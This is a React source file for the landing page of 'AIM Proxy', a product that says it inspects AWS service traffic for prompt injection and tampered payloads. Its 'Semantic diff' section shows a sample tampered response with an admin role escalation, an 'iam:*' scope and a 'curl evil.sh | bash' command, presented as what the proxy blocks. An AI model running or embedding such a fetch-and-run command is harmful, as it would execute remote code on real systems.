import { createFileRoute, Link } from "@tanstack/react-router";
import { motion, useReducedMotion } from "motion/react";
import { useEffect, useState } from "react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "AIM Proxy — AI-in-the-Middle for AWS" },
      {
        name: "description",
        content:
          "A Bedrock-powered proxy that sits between AWS services and inspects API payloads for adversarial prompts, poisoned schemas, and AI-generated tampering.",
      },
      { property: "og:title", content: "AIM Proxy — AI-in-the-Middle for AWS" },
      {
        property: "og:description",
        content:
          "Semantic diffing between expected and actual API responses to catch subtle AI-generated tampering across your AWS service mesh.",
      },
      { property: "og:type", content: "website" },
    ],
  }),
  component: Index,
});

const ease = [0.16, 1, 0.3, 1] as const;

function Index() {
  return (
    <div className="relative min-h-screen overflow-x-hidden bg-background text-foreground">
      <BackgroundFx />
      <Nav />
      <main className="relative z-10">
        <Hero />
        <LogosStrip />
        <Flow />
        <Features />
        <Diff />
        <CTA />
      </main>
      <Footer />
    </div>
  );
}

/* ───────────────────────────── BACKGROUND ───────────────────────────── */

function BackgroundFx() {
  return (
    <>
      <div className="pointer-events-none absolute inset-0 bg-grid [mask-image:radial-gradient(ellipse_at_top,black_30%,transparent_75%)]" />
      <div className="pointer-events-none absolute inset-x-0 top-0 h-[720px] bg-radial-fade" />
    </>
  );
}

/* ───────────────────────────── NAV ───────────────────────────── */

function Nav() {
  return (
    <motion.header
      initial={{ y: -20, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      transition={{ duration: 0.7, ease }}
      className="relative z-20 mx-auto flex w-full max-w-6xl items-center justify-between px-6 py-5"
    >
      <Link to="/" className="flex items-center gap-2">
        <LogoMark />
        <span className="font-display text-lg">AIM Proxy</span>
      </Link>
      <nav className="hidden items-center gap-8 text-sm text-muted-foreground md:flex">
        <a href="#flow" className="hover:text-foreground">How it works</a>
        <a href="#features" className="hover:text-foreground">Features</a>
        <a href="#diff" className="hover:text-foreground">Semantic Diff</a>
      </nav>
      <Link
        to="/configure"
        className="group inline-flex items-center gap-1.5 rounded-full bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition hover:opacity-90"
      >
        Configure AWS
        <span aria-hidden className="transition-transform group-hover:translate-x-0.5">→</span>
      </Link>
    </motion.header>
  );
}

function LogoMark() {
  return (
    <div className="relative grid h-7 w-7 place-items-center rounded-md hairline bg-card">
      <motion.div
        aria-hidden
        animate={{ opacity: [0.4, 1, 0.4] }}
        transition={{ duration: 2.4, repeat: Infinity, ease: "easeInOut" }}
        className="h-1.5 w-1.5 rounded-full bg-signal shadow-[0_0_12px_var(--signal)]"
      />
    </div>
  );
}

/* ───────────────────────────── HERO ───────────────────────────── */

function Hero() {
  const reduce = useReducedMotion();
  return (
    <section className="relative mx-auto max-w-6xl px-6 pb-24 pt-16 md:pb-32 md:pt-24">
      <motion.div
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6, ease }}
        className="mx-auto mb-6 inline-flex items-center gap-2 rounded-full hairline bg-card/60 px-3 py-1 text-xs text-muted-foreground backdrop-blur"
      >
        <span className="h-1.5 w-1.5 rounded-full bg-signal animate-pulse" />
        Bedrock-powered · Semantic firewall
      </motion.div>

      <h1 className="font-display text-balance text-5xl leading-[1.02] tracking-tight text-gradient md:text-7xl">
        <Reveal>The AI sitting in the</Reveal>
        <br />
        <Reveal delay={0.1}>
          <em className="italic text-signal">middle</em> of your AWS.
        </Reveal>
      </h1>

      <motion.p
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.7, ease, delay: 0.35 }}
        className="mt-6 max-w-2xl text-pretty text-base text-muted-foreground md:text-lg"
      >
        AIM Proxy sits between Lambda, S3, EC2 and DynamoDB — inspecting every payload for
        adversarial prompts, injected IAM policy text, and poisoned JSON schemas before
        they reach your services.
      </motion.p>

      <motion.div
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.7, ease, delay: 0.5 }}
        className="mt-9 flex flex-wrap items-center gap-3"
      >
        <Link
          to="/configure"
          className="inline-flex items-center gap-2 rounded-full bg-primary px-5 py-3 text-sm font-medium text-primary-foreground glow-ring transition hover:opacity-90"
        >
          Connect AWS securely
        </Link>
        <a
          href="#flow"
          className="inline-flex items-center gap-2 rounded-full hairline bg-card/60 px-5 py-3 text-sm text-foreground/90 backdrop-blur hover:bg-card"
        >
          See the flow
        </a>
      </motion.div>

      {/* Live proxy console mock */}
      <motion.div
        initial={{ opacity: 0, y: 30 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.9, ease, delay: 0.6 }}
        className="relative mt-16 md:mt-20"
      >
        <ConsoleCard reduce={!!reduce} />
      </motion.div>
    </section>
  );
}

function Reveal({ children, delay = 0 }: { children: React.ReactNode; delay?: number }) {
  return (
    <span className="inline-block overflow-hidden align-baseline">
      <motion.span
        initial={{ y: "110%" }}
        animate={{ y: "0%" }}
        transition={{ duration: 0.9, ease, delay }}
        className="inline-block"
      >
        {children}
      </motion.span>
    </span>
  );
}

function ConsoleCard({ reduce }: { reduce: boolean }) {
  const lines = [
    { t: "08:14:22", k: "INTERCEPT", src: "lambda://orders-fn", dst: "s3://billing/exports/", v: "ok" },
    { t: "08:14:22", k: "DIFF", note: "schema drift: +1 field `__exec`", v: "warn" },
    { t: "08:14:23", k: "BLOCK", note: "prompt injection in `metadata.note`", v: "bad" },
    { t: "08:14:24", k: "INTERCEPT", src: "ec2://api-3", dst: "dynamodb://users", v: "ok" },
    { t: "08:14:25", k: "DIFF", note: "IAM policy text injected via response.body", v: "bad" },
  ];
  return (
    <div className="relative rounded-2xl hairline bg-card/70 p-2 shadow-[var(--shadow-soft)] backdrop-blur">
      <div className="flex items-center justify-between rounded-xl border-b border-border/60 px-4 py-3">
        <div className="flex items-center gap-1.5">
          <span className="h-2.5 w-2.5 rounded-full bg-destructive/70" />
          <span className="h-2.5 w-2.5 rounded-full bg-yellow-400/70" />
          <span className="h-2.5 w-2.5 rounded-full bg-signal/80" />
        </div>
        <span className="font-mono text-[11px] text-muted-foreground">aim-proxy · live</span>
        <span className="font-mono text-[11px] text-signal">● stream</span>
      </div>
      <div className="grid gap-0 px-2 py-2 font-mono text-[12.5px] leading-relaxed">
        {lines.map((l, i) => (
          <motion.div
            key={i}
            initial={{ opacity: 0, x: -8 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.5, ease, delay: reduce ? 0 : 0.9 + i * 0.18 }}
            className="grid grid-cols-[80px_90px_1fr_auto] items-center gap-3 rounded-md px-3 py-1.5 hover:bg-secondary/60"
          >
            <span className="text-muted-foreground">{l.t}</span>
            <span
              className={
                l.k === "BLOCK"
                  ? "text-danger"
                  : l.k === "DIFF"
                  ? "text-accent"
                  : "text-signal"
              }
            >
              {l.k}
            </span>
            <span className="truncate text-foreground/80">
              {l.src ? `${l.src} → ${l.dst}` : l.note}
            </span>
            <span
              className={
                "rounded-full px-2 py-0.5 text-[10px] uppercase tracking-wide " +
                (l.v === "ok"
                  ? "bg-signal/15 text-signal"
                  : l.v === "warn"
                  ? "bg-accent/15 text-accent"
                  : "bg-danger/15 text-danger")
              }
            >
              {l.v}
            </span>
          </motion.div>
        ))}
      </div>
    </div>
  );
}

/* ───────────────────────────── LOGOS / SERVICES ───────────────────────────── */

function LogosStrip() {
  const services = ["Lambda", "S3", "EC2", "DynamoDB", "API Gateway", "Bedrock", "IAM", "SQS"];
  return (
    <section className="border-y border-border/60 bg-card/30 py-6">
      <div className="mx-auto flex max-w-6xl flex-wrap items-center justify-center gap-x-10 gap-y-3 px-6 text-xs uppercase tracking-[0.18em] text-muted-foreground">
        <span className="font-mono">Inspects traffic between</span>
        {services.map((s, i) => (
          <motion.span
            key={s}
            initial={{ opacity: 0, y: 6 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true, margin: "-10% 0px" }}
            transition={{ duration: 0.5, ease, delay: i * 0.04 }}
            className="font-mono text-foreground/70"
          >
            {s}
          </motion.span>
        ))}
      </div>
    </section>
  );
}

/* ───────────────────────────── FLOW ───────────────────────────── */

function Flow() {
  return (
    <section id="flow" className="relative mx-auto max-w-6xl px-6 py-24 md:py-32">
      <SectionHeader
        kicker="How it works"
        title={<>Drop AIM between any two AWS services.</>}
        sub="No agents, no SDK rewrites. Route through the proxy and we mirror, classify, and verify every request and response in real time."
      />

      <div className="mt-14 grid grid-cols-1 items-center gap-4 md:grid-cols-[1fr_auto_1fr_auto_1fr]">
        <FlowNode label="Lambda" sub="caller" />
        <Arrow />
        <FlowNode label="AIM Proxy" sub="Bedrock inspection · semantic diff" highlight />
        <Arrow />
        <FlowNode label="S3 / DynamoDB" sub="target" />
      </div>
    </section>
  );
}

function FlowNode({ label, sub, highlight }: { label: string; sub: string; highlight?: boolean }) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 12 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true, margin: "-15% 0px" }}
      transition={{ duration: 0.6, ease }}
      className={
        "relative rounded-2xl hairline p-6 text-center " +
        (highlight
          ? "bg-gradient-to-b from-card to-card/40 glow-ring"
          : "bg-card/50")
      }
    >
      {highlight && (
        <motion.div
          aria-hidden
          className="pointer-events-none absolute -inset-px rounded-2xl"
          style={{
            background:
              "conic-gradient(from 0deg, transparent, oklch(0.86 0.18 155 / 0.5), transparent 30%)",
          }}
          animate={{ rotate: 360 }}
          transition={{ duration: 8, repeat: Infinity, ease: "linear" }}
        />
      )}
      <div className="relative rounded-2xl bg-card/80 p-3">
        <div className="font-display text-2xl">{label}</div>
        <div className="mt-1 text-xs text-muted-foreground">{sub}</div>
      </div>
    </motion.div>
  );
}

function Arrow() {
  return (
    <div className="relative mx-auto flex h-10 w-full items-center justify-center md:h-10 md:w-16">
      <motion.div
        initial={{ scaleX: 0 }}
        whileInView={{ scaleX: 1 }}
        viewport={{ once: true }}
        transition={{ duration: 0.8, ease, delay: 0.1 }}
        className="h-px w-full origin-left bg-gradient-to-r from-transparent via-signal/60 to-transparent"
      />
      <motion.div
        animate={{ x: [0, 60, 0] }}
        transition={{ duration: 2.6, repeat: Infinity, ease: "easeInOut" }}
        className="absolute h-1.5 w-1.5 rounded-full bg-signal shadow-[0_0_10px_var(--signal)]"
      />
    </div>
  );
}

/* ───────────────────────────── FEATURES ───────────────────────────── */

const features = [
  {
    title: "Prompt injection detection",
    body: "Catches adversarial instructions hidden in JSON fields, headers, and metadata before downstream services act on them.",
  },
  {
    title: "Semantic response diffing",
    body: "Compares actual API responses against expected schemas using Bedrock embeddings — not regex.",
  },
  {
    title: "Poisoned schema alarms",
    body: "Flags injected IAM policy text, suspicious `__exec` fields, and structural drift in returned payloads.",
  },
  {
    title: "Zero-touch routing",
    body: "Use AIM as a regional endpoint — your Lambdas keep calling AWS, we sit silently in the middle.",
  },
  {
    title: "Encrypted credential vault",
    body: "Your AWS keys are encrypted at rest, scoped per-environment, and never logged. Rotate any time.",
  },
  {
    title: "Audit-ready trails",
    body: "Every intercept, diff, and block is signed and exportable — built for SOC2 and FedRAMP timelines.",
  },
];

function Features() {
  return (
    <section id="features" className="relative mx-auto max-w-6xl px-6 py-24 md:py-32">
      <SectionHeader
        kicker="Capabilities"
        title={<>A semantic firewall, not a regex.</>}
        sub="AIM Proxy understands the meaning of your traffic — not just its shape."
      />
      <div className="mt-14 grid grid-cols-1 gap-px overflow-hidden rounded-2xl hairline bg-border sm:grid-cols-2 lg:grid-cols-3">
        {features.map((f, i) => (
          <motion.div
            key={f.title}
            initial={{ opacity: 0, y: 16 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true, margin: "-10% 0px" }}
            transition={{ duration: 0.6, ease, delay: i * 0.05 }}
            className="group relative bg-card p-7 transition hover:bg-card/70"
          >
            <div className="mb-5 inline-flex h-8 w-8 items-center justify-center rounded-md bg-signal/10 text-signal">
              <span className="font-mono text-xs">0{i + 1}</span>
            </div>
            <h3 className="font-display text-xl">{f.title}</h3>
            <p className="mt-2 text-sm leading-relaxed text-muted-foreground">{f.body}</p>
            <div className="absolute inset-x-0 bottom-0 h-px scale-x-0 bg-signal/60 transition-transform duration-500 group-hover:scale-x-100" />
          </motion.div>
        ))}
      </div>
    </section>
  );
}

/* ───────────────────────────── DIFF ───────────────────────────── */

function Diff() {
  const expected = `{
  "userId": "u_193",
  "role": "viewer",
  "scopes": ["read:invoice"]
}`;
  const actual = `{
  "userId": "u_193",
  "role": "admin",
  "scopes": ["read:invoice", "iam:*"],
  "__exec": "curl evil.sh | bash"
}`;
  return (
    <section id="diff" className="relative mx-auto max-w-6xl px-6 py-24 md:py-32">
      <SectionHeader
        kicker="Semantic diff"
        title={<>Spot tampering a regex would miss.</>}
        sub="Bedrock embeddings compare meaning between the expected schema and what actually came back."
      />

      <div className="mt-12 grid grid-cols-1 gap-4 md:grid-cols-2">
        <DiffPane label="Expected" tone="ok" code={expected} />
        <DiffPane label="Actual" tone="bad" code={actual} typewrite />
      </div>

      <motion.div
        initial={{ opacity: 0, y: 8 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.6, ease }}
        className="mt-4 rounded-xl hairline bg-card/60 p-4 font-mono text-sm"
      >
        <span className="text-danger">● blocked</span>
        <span className="ml-3 text-muted-foreground">
          IAM scope escalation + injected shell instruction (semantic similarity 0.31)
        </span>
      </motion.div>
    </section>
  );
}

function DiffPane({
  label,
  tone,
  code,
  typewrite,
}: {
  label: string;
  tone: "ok" | "bad";
  code: string;
  typewrite?: boolean;
}) {
  const [shown, setShown] = useState(typewrite ? "" : code);
  const reduce = useReducedMotion();

  useEffect(() => {
    if (!typewrite || reduce) {
      setShown(code);
      return;
    }
    let i = 0;
    const id = setInterval(() => {
      i += 2;
      setShown(code.slice(0, i));
      if (i >= code.length) clearInterval(id);
    }, 18);
    return () => clearInterval(id);
  }, [code, typewrite, reduce]);

  return (
    <motion.div
      initial={{ opacity: 0, y: 16 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true, margin: "-10% 0px" }}
      transition={{ duration: 0.7, ease }}
      className="overflow-hidden rounded-2xl hairline bg-card/70 backdrop-blur"
    >
      <div className="flex items-center justify-between border-b border-border/60 px-4 py-2.5">
        <span className="font-mono text-xs text-muted-foreground">{label}</span>
        <span
          className={
            "rounded-full px-2 py-0.5 font-mono text-[10px] uppercase " +
            (tone === "ok" ? "bg-signal/15 text-signal" : "bg-danger/15 text-danger")
          }
        >
          {tone === "ok" ? "verified" : "tampered"}
        </span>
      </div>
      <pre className="overflow-x-auto p-5 font-mono text-[13px] leading-relaxed text-foreground/90">
        <code>{shown}</code>
        {typewrite && shown.length < code.length && (
          <span className="ml-0.5 inline-block h-3.5 w-1.5 -mb-0.5 animate-pulse bg-signal" />
        )}
      </pre>
    </motion.div>
  );
}

/* ───────────────────────────── CTA ───────────────────────────── */

function CTA() {
  return (
    <section className="relative mx-auto max-w-6xl px-6 pb-32 pt-12">
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.8, ease }}
        className="relative overflow-hidden rounded-3xl hairline bg-gradient-to-br from-card via-card to-card/40 p-10 text-center md:p-16"
      >
        <div className="pointer-events-none absolute inset-0 bg-radial-fade" />
        <h2 className="relative font-display text-4xl text-gradient md:text-5xl">
          Put the AI in the middle.
        </h2>
        <p className="relative mx-auto mt-4 max-w-xl text-muted-foreground">
          Connect your AWS account in under a minute. Credentials are encrypted before they
          ever leave your browser.
        </p>
        <div className="relative mt-8">
          <Link
            to="/configure"
            className="inline-flex items-center gap-2 rounded-full bg-primary px-6 py-3 text-sm font-medium text-primary-foreground glow-ring transition hover:opacity-90"
          >
            Configure AWS securely →
          </Link>
        </div>
      </motion.div>
    </section>
  );
}

function SectionHeader({
  kicker,
  title,
  sub,
}: {
  kicker: string;
  title: React.ReactNode;
  sub: string;
}) {
  return (
    <div className="max-w-2xl">
      <motion.div
        initial={{ opacity: 0, y: 8 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.5, ease }}
        className="mb-4 inline-flex items-center gap-2 font-mono text-xs uppercase tracking-[0.2em] text-signal"
      >
        <span className="h-px w-6 bg-signal/60" />
        {kicker}
      </motion.div>
      <motion.h2
        initial={{ opacity: 0, y: 12 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.7, ease }}
        className="font-display text-4xl tracking-tight text-gradient md:text-5xl"
      >
        {title}
      </motion.h2>
      <motion.p
        initial={{ opacity: 0, y: 10 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.7, ease, delay: 0.1 }}
        className="mt-4 text-muted-foreground"
      >
        {sub}
      </motion.p>
    </div>
  );
}

function Footer() {
  return (
    <footer className="relative z-10 border-t border-border/60">
      <div className="mx-auto flex max-w-6xl flex-col items-center justify-between gap-3 px-6 py-8 text-xs text-muted-foreground md:flex-row">
        <div className="flex items-center gap-2">
          <LogoMark />
          <span>AIM Proxy · AI-in-the-Middle for AWS</span>
        </div>
        <span className="font-mono">© {new Date().getFullYear()} — built for paranoid engineers</span>
      </div>
    </footer>
  );
}
